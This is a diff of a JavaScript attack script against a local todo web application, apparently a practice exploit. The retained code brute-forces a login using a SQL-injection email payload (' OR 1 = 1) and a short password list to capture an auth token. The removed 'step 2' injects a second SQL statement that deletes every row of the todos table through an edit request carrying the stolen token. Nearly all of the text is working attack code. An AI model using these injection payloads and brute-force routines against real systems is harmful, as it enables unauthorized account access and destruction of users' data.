@@ -1,8 +1,10 @@
+const fetch = require('node-fetch');
+
 // step 1
 
 // script brute force using javascript!
 
-let tokenStealth;
+let tokenStealth = '';
 
 const email = `' OR 1 = 1; -- '`;  // bypass email
 const trials = ['admin', 'user', 'cook', 'furry', '123', '1234'];
@@ -24,36 +26,9 @@ return response.status == 200 ? await response.json() : null;
 })(email, pass).then((e) => {
 
 console.log(e);
-tokenStealth = e.data.token;
+tokenStealth = e?.data?.token ?? tokenStealth;
 })
 }
 
-// step 2
+console.log('token', tokenStealth);
 
-// inject mysql query!
-(async function(token) {
-
-const query = 'DELETE FROM `todos` WHERE 1 = 1';
-
-const data = {
-    "description": `' WHERE 1 = 0; ${query};  --`,
-    "deadline": 1701772895425,
-    "finished": false
-}
-
-const response = await fetch("http://localhost/admin/todos/edit?id=1", {
-  "headers": {
-    "accept": "*/*",
-    "accept-language": "en-US,en;q=0.9,id;q=0.8",
-    "content-type": "application/json",
-    "authorization": "Bearer " + token
-  },
-  "body": JSON.stringify(data),
-  "method": "PUT",
-});
-
-return response.status == 200 ? await response.json() : null;
-})(tokenStealth).then((e) => {
-
-console.log(e);
-})
